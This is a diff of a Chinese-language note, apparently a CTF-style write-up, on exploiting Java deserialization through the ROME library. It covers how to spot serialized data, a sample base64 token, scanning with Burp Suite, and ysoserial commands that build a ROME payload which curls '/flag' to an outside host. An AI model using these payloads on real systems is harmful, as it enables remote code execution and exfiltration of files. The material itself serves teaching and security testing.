@@ -17,8 +17,7 @@ ROME的应用场景包括新闻聚合应用、博客平台的RSS输出、数据�
 
 <https://xz.aliyun.com/t/13286?u_atoken=bcc44563e868bc8bbf88f038f56e5316&u_asig=1a0c39a017285446910872366e0133>
 
-## **利用**
-入口：
+## **常规入口场景**
 下方的特征可以作为序列化的标志参考：
 一段数据以rO0AB开头，你基本可以确定这串就是Java序列化base64加密的数据。
 或者如果以aced开头，那么他就是这一段Java序列化的16进制。
@@ -28,8 +27,8 @@ ROME的应用场景包括新闻聚合应用、博客平台的RSS输出、数据�
 ```
 Authorization Bearer rO0ABXNyABhjbi5hYmMuY29yZS5tb2RlbC5Vc2VyVm92RkMxewT0OgIAAkwAAmlkdAAQTGphdmEvbGFuZy9Mb25nO0wABG5hbWV0ABJMamF2YS9sYW5nL1N0cmluZzt4cHNyAA5qYXZhLmxhbmcuTG9uZzuL5JDMjyPfAgABSgAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAAAAAAAAXQABWFkbWlu
 ```
-
-
+可以使用burpsuite的java DeserializationScanner插件扫描可利用链，或者代码审计依赖利用链
+## **利用**
 ```
 java -jar ysoserial-0.0.6-SNAPSHOT-all.jar ROME "curl http://vps:7015 -d @/flag" > a.bin
 java -jar ysoserial.jar ROME "curl http://1.2.90.186:1234 -d @/flag" |base64
